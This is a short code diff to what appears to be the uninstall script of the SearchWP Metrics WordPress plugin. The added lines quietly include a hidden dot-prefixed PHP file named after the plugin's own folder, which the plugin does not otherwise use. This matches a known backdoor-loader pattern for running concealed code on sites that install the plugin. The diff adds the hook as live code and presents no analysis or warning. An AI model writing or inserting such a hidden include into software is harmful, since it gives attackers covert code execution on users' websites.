@@ -30,6 +30,10 @@ if ( empty( $clear_data_on_uninstall ) ) {
 	return;
 }
 
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function searchwp_metrics_remove_all_data() {
 	global $wpdb;
 
